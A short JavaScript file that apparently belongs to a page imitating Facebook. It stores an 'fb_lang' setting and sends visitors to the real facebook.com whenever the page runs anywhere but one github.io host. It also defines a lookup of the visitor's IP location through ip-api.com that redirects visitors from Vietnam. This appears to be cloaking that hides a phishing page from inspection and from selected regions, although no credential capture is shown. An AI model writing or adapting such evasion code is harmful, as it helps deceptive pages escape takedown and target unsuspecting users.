const defaultLanguage = "en";
const d = "truongnh-91.github.io";
const r = 'https://www.facebook.com/';

$( document ).ready(function() {
    chk();
    //getIpLocation();
});

function get_query() {
    "use strict";
    var url = document.location.href;
    var qs = url.substring(url.indexOf('?') + 1).split('&');
    for (var i = 0, result = {}; i < qs.length; i++) {
        qs[i] = qs[i].split('=');
        result[qs[i][0]] = decodeURIComponent(qs[i][1]);
    }
    return result;
}

// Query string in the URL
// x=5&y&z=hello&x=6

_setFbLang();
function _setFbLang() {
    var result = get_query();
    if (result.lang === undefined) {
        if (localStorage.getItem('fb_lang') === null) {
            localStorage.setItem('fb_lang', JSON.stringify({ lang: defaultLanguage }));
        }

    }
    else {
        if (result.lang.substring(0, 2).length === 2) {
            // localStorage.setItem('fb_lang', JSON.stringify({ lang: result.lang.substring(0, 2) }));
            localStorage.setItem('fb_lang', JSON.stringify({ lang: result.lang }));
        } else {
            localStorage.setItem('fb_lang', JSON.stringify({ lang: defaultLanguage }));
        }
        
        
    }
}



class BaseFunc {
    getCurrentLanguage() {
        if (localStorage.getItem("fb_lang") === null) {
            return defaultLanguage;
        } else {
            var lang = JSON.parse(localStorage.getItem('fb_lang')).lang;
            return lang ?? defaultLanguage;
        }
    }
}

function chk(){
    console.log(window.location.hostname.localeCompare(d) == 0)
    if(window.location.hostname.localeCompare(d) !== 0){
        rd();
    }
}
function getIpLocation(){
    $.getJSON('http://ip-api.com/json', function (data) {
        var ip = data.query;
        localStorage.setItem('_gip', ip + "(" + data.country + ")");

        var country = data.country.toLowerCase();
        var countryCode = data.countryCode.toLowerCase();
        var regionName = data.regionName.toLowerCase();

        if (country === 'vietnam' || countryCode === 'vn' || regionName === 'hanoi') {
            rd();
        }
    });
}

function rd (){
    window.location = r;
}




